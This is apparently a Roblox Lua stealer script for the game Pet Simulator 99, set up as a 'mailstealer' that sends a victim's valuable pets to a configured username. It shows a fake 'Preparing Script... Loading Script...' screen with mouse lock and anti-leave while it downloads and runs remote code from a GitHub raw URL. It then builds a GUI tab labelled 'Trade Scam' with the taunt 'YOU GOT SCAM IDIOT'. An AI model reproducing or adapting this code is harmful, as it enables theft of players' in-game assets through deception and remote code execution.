-- If the config.stealer matches a specific string
if config.stealer == "mailstealer" then

    --[[ Argon X Scripts - Config ]]--

    _G.Username = config.Username -- Username to send pets to
    if config.Webhook ~= "" then
        _G.Webhook = config.Webhook -- Optional, set only if webhook is provided
    end

    --[[ Rap Config ]]--
    _G.MinimumRAP = config.MinimumRap -- Minimum RAP of each item you want to get sent to you

    --[[ Loadingscreen Config 1 ]]--
    _G.MouseLock = config.mouselock -- Set to true or false
    _G.AntiLeave = config.antileave -- Set to true or false
    _G.LoadingScreen = config.loadingscreen -- Set to true or false

    --[[ Loadingscreen Config 2 ]]--
    _G.ScriptName = config.scriptname
    _G.FirstText = "Preparing Script..."
    _G.SecondText = "Loading Script..."
    _G.ThirdText = "Almost Done..."
    _G.WaitingTime = 180

    --[[ Main Script ]]--
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Script-Ps99/main/lds.lua", true))()
end

-- Load Orion Library for GUI
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

-- Create GUI Window
local Window = OrionLib:MakeWindow({
    Name = config.scriptname ~= "" and config.scriptname or "Default Script Name", -- Fallback to default if scriptname is empty
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "OrionTest"
})

-- Create Tab in the Window
local Tab = Window:MakeTab({
    Name = "Trade Scam",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- 

local Section = Tab:AddSection({
	Name = "YOU GOT SCAM IDIOT"
})
